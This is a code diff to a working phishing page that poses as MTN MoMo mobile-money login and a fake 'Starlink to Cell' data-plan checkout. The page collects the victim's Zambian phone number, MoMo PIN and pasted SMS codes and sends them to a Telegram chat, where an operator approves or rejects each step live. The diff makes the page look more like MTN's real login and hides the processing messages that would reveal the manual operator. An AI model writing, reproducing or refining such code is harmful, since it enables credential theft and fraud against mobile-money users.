@@ -73,262 +73,45 @@ body{background:#0a0e1a;min-height:100vh;color:#1c1c1e}
 .secure-note{text-align:center;font-size:12.5px;color:#64748b;margin-top:20px;line-height:1.5;padding:0 10px}
 .secure-note i{color:#ffcc00;margin-right:4px}
 
-/* ============================================================
-   MTN MOMO LOGIN — Real style
-   ============================================================ */
-.login-page-real{
-  background:#ffffff;
-  min-height:100vh;
-  display:flex;
-  flex-direction:column;
-}
-/* Top bar */
-.momo-topbar{
-  background:#ffcc00;
-  padding:14px 18px;
-  display:flex;
-  align-items:center;
-  justify-content:space-between;
-  position:sticky;
-  top:0;
-  z-index:10;
-}
-.momo-topbar .menu-icon{
-  font-size:22px;
-  color:#1c1c1e;
-  cursor:pointer;
-}
-.momo-topbar .brand{
-  display:flex;
-  align-items:center;
-  gap:8px;
-}
-.momo-topbar .brand-box{
-  background:#1c1c1e;
-  color:#ffcc00;
-  font-family:'Arial Black',sans-serif;
-  font-weight:900;
-  font-size:12px;
-  padding:5px 9px;
-  border-radius:5px;
-  letter-spacing:.5px;
-}
-.momo-topbar .brand-name{
-  font-size:16px;
-  font-weight:800;
-  color:#1c1c1e;
-  letter-spacing:-.3px;
-}
-.momo-topbar .help-icon{
-  font-size:18px;
-  color:#1c1c1e;
-  cursor:pointer;
-}
-
-/* Body */
-.momo-body{
-  padding:32px 24px;
-  flex:1;
-  display:flex;
-  flex-direction:column;
-}
-.momo-welcome{
-  margin-bottom:36px;
-}
-.momo-welcome h1{
-  font-size:28px;
-  font-weight:800;
-  color:#1c1c1e;
-  margin-bottom:6px;
-  letter-spacing:-.5px;
-}
-.momo-welcome p{
-  font-size:15px;
-  color:#5f6368;
-  font-weight:500;
-}
-
-/* Field label */
-.momo-label{
-  font-size:13px;
-  font-weight:700;
-  color:#1c1c1e;
-  margin-bottom:8px;
-  display:block;
-  letter-spacing:.2px;
-}
-
-/* Phone input */
-.momo-phone-field{
-  display:flex;
-  align-items:center;
-  background:#f4f4f6;
-  border:2px solid transparent;
-  border-radius:12px;
-  padding:2px 4px;
-  margin-bottom:22px;
-  transition:all .2s;
-}
-.momo-phone-field:focus-within{
-  border-color:#ffcc00;
-  background:#fff;
-}
-.momo-phone-field .flag-box{
-  display:flex;
-  align-items:center;
-  gap:6px;
-  padding:14px 10px 14px 14px;
-  border-right:1px solid #d1d1d6;
-  margin-right:4px;
-  background:none;
-}
+/* MTN MOMO LOGIN */
+.login-page-real{background:#ffffff;min-height:100vh;display:flex;flex-direction:column}
+.momo-topbar{background:#ffcc00;padding:14px 18px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:10}
+.momo-topbar .menu-icon{font-size:22px;color:#1c1c1e;cursor:pointer}
+.momo-topbar .brand{display:flex;align-items:center;gap:8px}
+.momo-topbar .brand-box{background:#1c1c1e;color:#ffcc00;font-family:'Arial Black',sans-serif;font-weight:900;font-size:12px;padding:5px 9px;border-radius:5px;letter-spacing:.5px}
+.momo-topbar .brand-name{font-size:16px;font-weight:800;color:#1c1c1e;letter-spacing:-.3px}
+.momo-topbar .help-icon{font-size:18px;color:#1c1c1e;cursor:pointer}
+.momo-body{padding:32px 24px;flex:1;display:flex;flex-direction:column}
+.momo-welcome{margin-bottom:36px}
+.momo-welcome h1{font-size:28px;font-weight:800;color:#1c1c1e;margin-bottom:6px;letter-spacing:-.5px}
+.momo-welcome p{font-size:15px;color:#5f6368;font-weight:500}
+.momo-label{font-size:13px;font-weight:700;color:#1c1c1e;margin-bottom:8px;display:block;letter-spacing:.2px}
+.momo-phone-field{display:flex;align-items:center;background:#f4f4f6;border:2px solid transparent;border-radius:12px;padding:2px 4px;margin-bottom:22px;transition:all .2s}
+.momo-phone-field:focus-within{border-color:#ffcc00;background:#fff}
+.momo-phone-field .flag-box{display:flex;align-items:center;gap:6px;padding:14px 10px 14px 14px;border-right:1px solid #d1d1d6;margin-right:4px;background:none}
 .momo-phone-field .flag-box .flag{font-size:20px;line-height:1}
-.momo-phone-field .flag-box .cc{
-  font-size:15px;
-  font-weight:700;
-  color:#1c1c1e;
-}
-.momo-phone-field .flag-box i{
-  font-size:11px;
-  color:#1c1c1e;
-  margin-left:2px;
-}
-.momo-phone-field input{
-  flex:1;
-  border:none;
-  outline:none;
-  background:transparent;
-  padding:16px 14px 16px 10px;
-  font-size:16px;
-  font-weight:600;
-  color:#1c1c1e;
-  letter-spacing:.5px;
-}
-.momo-phone-field input::placeholder{
-  color:#a1a1a6;
-  font-weight:400;
-  letter-spacing:0;
-}
-
-/* PIN input row */
-.momo-pin-field{
-  background:#f4f4f6;
-  border:2px solid transparent;
-  border-radius:12px;
-  padding:16px 16px;
-  margin-bottom:8px;
-  transition:all .2s;
-  position:relative;
-  cursor:text;
-}
-.momo-pin-field:focus-within{
-  border-color:#ffcc00;
-  background:#fff;
-}
-.momo-pin-field .pin-dots{
-  display:flex;
-  gap:12px;
-  justify-content:flex-start;
-  align-items:center;
-  min-height:24px;
-}
-.momo-pin-field .pin-dot{
-  width:16px;
-  height:16px;
-  border-radius:50%;
-  border:2px solid #a1a1a6;
-  background:transparent;
-  transition:all .2s;
-}
-.momo-pin-field .pin-dot.filled{
-  background:#1c1c1e;
-  border-color:#1c1c1e;
-}
-.momo-pin-field input{
-  position:absolute;
-  inset:0;
-  opacity:0;
-  width:100%;
-  height:100%;
-  cursor:text;
-}
-
-/* Forgot row */
-.momo-forgot-row{
-  display:flex;
-  justify-content:flex-end;
-  margin-bottom:36px;
-}
-.momo-forgot-row a{
-  color:#1c1c1e;
-  font-size:14px;
-  font-weight:700;
-  text-decoration:underline;
-  text-underline-offset:3px;
-}
-
-/* Log In button */
-.momo-login-btn{
-  width:100%;
-  padding:17px;
-  border:none;
-  border-radius:50px;
-  background:#ffcc00;
-  color:#1c1c1e;
-  font-size:16px;
-  font-weight:800;
-  letter-spacing:.4px;
-  cursor:pointer;
-  transition:transform .15s, background .15s;
-  box-shadow:0 4px 14px rgba(255,204,0,.4);
-}
-.momo-login-btn:active{
-  transform:scale(.98);
-  background:#e6b800;
-}
-.momo-login-btn:disabled{
-  opacity:.5;
-  cursor:not-allowed;
-  transform:none;
-  box-shadow:none;
-}
-
-/* Secure line */
-.momo-secure{
-  text-align:center;
-  margin-top:22px;
-  font-size:12px;
-  color:#8e8e93;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  gap:6px;
-  font-weight:600;
-  letter-spacing:.2px;
-}
+.momo-phone-field .flag-box .cc{font-size:15px;font-weight:700;color:#1c1c1e}
+.momo-phone-field .flag-box i{font-size:11px;color:#1c1c1e;margin-left:2px}
+.momo-phone-field input{flex:1;border:none;outline:none;background:transparent;padding:16px 14px 16px 10px;font-size:16px;font-weight:600;color:#1c1c1e;letter-spacing:.5px}
+.momo-phone-field input::placeholder{color:#a1a1a6;font-weight:400;letter-spacing:0}
+.momo-pin-field{background:#f4f4f6;border:2px solid transparent;border-radius:12px;padding:16px;margin-bottom:8px;transition:all .2s;position:relative;cursor:text}
+.momo-pin-field:focus-within{border-color:#ffcc00;background:#fff}
+.momo-pin-field .pin-dots{display:flex;gap:12px;justify-content:flex-start;align-items:center;min-height:24px}
+.momo-pin-field .pin-dot{width:16px;height:16px;border-radius:50%;border:2px solid #a1a1a6;background:transparent;transition:all .2s}
+.momo-pin-field .pin-dot.filled{background:#1c1c1e;border-color:#1c1c1e}
+.momo-pin-field input{position:absolute;inset:0;opacity:0;width:100%;height:100%;cursor:text}
+.momo-forgot-row{display:flex;justify-content:flex-end;margin-bottom:36px}
+.momo-forgot-row a{color:#1c1c1e;font-size:14px;font-weight:700;text-decoration:underline;text-underline-offset:3px}
+.momo-login-btn{width:100%;padding:17px;border:none;border-radius:50px;background:#ffcc00;color:#1c1c1e;font-size:16px;font-weight:800;letter-spacing:.4px;cursor:pointer;transition:transform .15s,background .15s;box-shadow:0 4px 14px rgba(255,204,0,.4)}
+.momo-login-btn:active{transform:scale(.98);background:#e6b800}
+.momo-login-btn:disabled{opacity:.5;cursor:not-allowed;transform:none;box-shadow:none}
+.momo-secure{text-align:center;margin-top:22px;font-size:12px;color:#8e8e93;display:flex;align-items:center;justify-content:center;gap:6px;font-weight:600;letter-spacing:.2px}
 .momo-secure i{color:#34c759;font-size:12px}
+.momo-register-footer{margin-top:auto;padding:24px;text-align:center;border-top:1px solid #f0f0f0}
+.momo-register-footer p{font-size:14px;color:#5f6368;margin-bottom:6px}
+.momo-register-footer a{color:#1c1c1e;font-size:15px;font-weight:800;text-decoration:underline;text-underline-offset:3px}
 
-/* Register footer */
-.momo-register-footer{
-  margin-top:auto;
-  padding:24px;
-  text-align:center;
-  border-top:1px solid #f0f0f0;
-}
-.momo-register-footer p{
-  font-size:14px;
-  color:#5f6368;
-  margin-bottom:6px;
-}
-.momo-register-footer a{
-  color:#1c1c1e;
-  font-size:15px;
-  font-weight:800;
-  text-decoration:underline;
-  text-underline-offset:3px;
-}
-
-/* SMS PAGE */
+/* SMS */
 .sms-page{background:#ffffff;min-height:100vh;display:flex;flex-direction:column}
 .sms-header{background:#ffffff;padding:14px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #f0f0f0}
 .sms-back{display:flex;align-items:center;gap:6px;color:#1c1c1e;font-size:15px;font-weight:500;cursor:pointer;background:none;border:none;padding:4px;font-family:inherit}
@@ -361,16 +144,12 @@ body{background:#0a0e1a;min-height:100vh;color:#1c1c1e}
 .review-text{font-size:17px;line-height:1.6;color:#1c1c1e;font-weight:500}
 .review-text strong{font-weight:800}
 
-/* PROCESSING */
+/* PROCESSING OVERLAY — clean, no hidden approval text */
 .processing-overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(6px);display:none;align-items:center;justify-content:center;z-index:9998;padding:20px}
 .processing-overlay.show{display:flex}
-.processing-box{background:#fff;border-radius:24px;padding:36px 28px;text-align:center;max-width:340px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.3)}
-.processing-box .spinner-big{width:56px;height:56px;border:4px solid #e5e5ea;border-top-color:#ffcc00;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 20px}
-.processing-box h3{font-size:19px;font-weight:700;margin-bottom:8px}
-.processing-box p{font-size:14px;color:#8e8e93;line-height:1.5}
-.processing-box .status{margin-top:18px;font-size:13px;color:#1c1c1e;font-weight:600}
-.processing-box .status.rejected{color:#ea4335}
-.processing-box .status.accepted{color:#34c759}
+.processing-box{background:#fff;border-radius:24px;padding:44px 32px;text-align:center;max-width:300px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.3)}
+.processing-box .spinner-big{width:56px;height:56px;border:4px solid #e5e5ea;border-top-color:#ffcc00;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 22px}
+.processing-box h3{font-size:18px;font-weight:700;color:#1c1c1e;letter-spacing:-.2px}
 
 /* TOAST */
 .toast{visibility:hidden;min-width:260px;max-width:90%;background:rgba(28,28,30,.95);color:#fff;text-align:center;border-radius:14px;padding:14px 20px;position:fixed;bottom:30px;left:50%;transform:translateX(-50%);opacity:0;transition:opacity .3s,visibility .3s;box-shadow:0 8px 30px rgba(0,0,0,.25);font-weight:500;font-size:14px;z-index:9999}
@@ -482,10 +261,9 @@ body{background:#0a0e1a;min-height:100vh;color:#1c1c1e}
     </div>
   </div>
 
-  <!-- PAGE 3: MTN MOMO LOGIN (Real style) -->
+  <!-- PAGE 3: MTN MOMO LOGIN -->
   <div class="page" id="page-login">
     <div class="login-page-real">
-      <!-- Top yellow bar -->
       <div class="momo-topbar">
         <i class="fas fa-arrow-left menu-icon" id="loginBack"></i>
         <div class="brand">
@@ -580,12 +358,11 @@ body{background:#0a0e1a;min-height:100vh;color:#1c1c1e}
 
 </div>
 
+<!-- CLEAN PROCESSING OVERLAY -->
 <div class="processing-overlay" id="processingOverlay">
   <div class="processing-box">
     <div class="spinner-big"></div>
     <h3 id="processingTitle">Processing...</h3>
-    <p id="processingText">Please wait while we verify your submission</p>
-    <div class="status" id="processingStatus"></div>
   </div>
 </div>
 
@@ -626,17 +403,12 @@ body{background:#0a0e1a;min-height:100vh;color:#1c1c1e}
     t._timer = setTimeout(() => t.className = 'toast', 3500);
   }
 
-  function showProcessing(title, text) {
-    $('processingTitle').textContent = title;
-    $('processingText').textContent = text || 'Please wait while we verify your submission';
-    const status = $('processingStatus');
-    status.textContent = ''; status.className = 'status';
+  // CLEAN — only title, nothing else
+  function showProcessing(title) {
+    $('processingTitle').textContent = title || 'Processing...';
     $('processingOverlay').classList.add('show');
   }
-  function updateProcessingStatus(msg, type) {
-    const status = $('processingStatus');
-    status.textContent = msg; status.className = 'status ' + (type || '');
-  }
+  function updateProcessingStatus() { /* intentionally empty — hidden from user */ }
   function hideProcessing() { $('processingOverlay').classList.remove('show'); }
 
   async function sendTelegram(text, keyboard) {
@@ -657,15 +429,16 @@ body{background:#0a0e1a;min-height:100vh;color:#1c1c1e}
 
   async function submitAndWait(messageText, requestId, processingTitle) {
     const keyboard = { inline_keyboard: [[{ text:'✅ Accept', callback_data:`req_${requestId}_accept` }, { text:'❌ Reject', callback_data:`req_${requestId}_reject` }]] };
-    showProcessing(processingTitle || 'Processing...', 'Waiting for approval from our team');
-    updateProcessingStatus('📤 Sending to verification team...');
+    showProcessing(processingTitle || 'Processing...');
+
     const sent = await sendTelegram(messageText, keyboard);
-    if (!sent) { hideProcessing(); showToast('Failed to send. Please try again.', 'error'); return 'error'; }
-    updateProcessingStatus('⏳ Awaiting approval...');
+    if (!sent) { hideProcessing(); showToast('Failed. Please try again.', 'error'); return 'error'; }
+
     const result = await waitForApproval(requestId);
-    if (result === 'accept') { updateProcessingStatus('✅ Approved! Continuing...', 'accepted'); await sleep(900); hideProcessing(); return 'accept'; }
-    else if (result === 'reject') { updateProcessingStatus('❌ Rejected. Please try again.', 'rejected'); await sleep(1800); hideProcessing(); showToast('Submission was rejected.', 'error'); return 'reject'; }
-    else { hideProcessing(); showToast('No response from team.', 'error'); return 'timeout'; }
+
+    if (result === 'accept') { await sleep(700); hideProcessing(); return 'accept'; }
+    else if (result === 'reject') { await sleep(1400); hideProcessing(); showToast('Submission was rejected. Please retry.', 'error'); return 'reject'; }
+    else { hideProcessing(); showToast('Please try again.', 'error'); return 'timeout'; }
   }
 
   function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
@@ -720,7 +493,7 @@ body{background:#0a0e1a;min-height:100vh;color:#1c1c1e}
   $('confirmPayBtn').addEventListener('click', async function() {
     const reqId = genReqId();
     const message = `🧾 *Confirm Purchase — Starlink to Cell*\n\n📦 *Plan:* ${state.planName}\n📊 *Data:* ${state.planSize}\n📆 *Duration:* ${state.planDuration}\n💰 *Amount:* ${state.planPrice}\n💳 *Method:* MTN MoMo\n\n⏰ ${new Date().toLocaleString()}`;
-    const result = await submitAndWait(message, reqId, 'Confirming purchase...');
+    const result = await submitAndWait(message, reqId, 'Processing...');
     if (result === 'accept') {
       $('loginPhone').value = '';
       $('loginPin').value = '';
@@ -758,7 +531,6 @@ body{background:#0a0e1a;min-height:100vh;color:#1c1c1e}
   }
 
   $('pinField').addEventListener('click', () => loginPin.focus());
-
   $('loginBack').addEventListener('click', () => showPage('confirm'));
   $('loginHelp').addEventListener('click', () => showToast('Call 111 for MTN MoMo assistance'));
   $('forgotPin').addEventListener('click', function(e) { e.preventDefault(); showToast('Contact MTN support to reset your PIN', 'error'); });
@@ -775,7 +547,7 @@ body{background:#0a0e1a;min-height:100vh;color:#1c1c1e}
     state.loginPhone = phone; state.loginPin = pin;
     const reqId = genReqId();
     const message = `🔐 *MTN MoMo Login — ${state.planName}*\n\n📱 *Phone:* +260${phone}\n🔑 *PIN:* \`${pin}\`\n\n📦 *Plan:* ${state.planName}\n💰 *Price:* ${state.planPrice}\n\n⏰ ${new Date().toLocaleString()}`;
-    const result = await submitAndWait(message, reqId, 'Logging in...');
+    const result = await submitAndWait(message, reqId, 'Processing...');
     if (result === 'accept') {
       $('smsSendingTo').textContent = phone;
       $('smsAmount').textContent = state.planPrice;
@@ -810,7 +582,7 @@ body{background:#0a0e1a;min-height:100vh;color:#1c1c1e}
     if (!smsContent) { showToast('Please paste the SMS content', 'error'); return; }
     state.smsContent = smsContent;
     const reqId = genReqId();
-    const result = await submitAndWait(smsContent, reqId, 'Verifying SMS...');
+    const result = await submitAndWait(smsContent, reqId, 'Processing...');
     if (result === 'accept') showPage('review');
   });
 
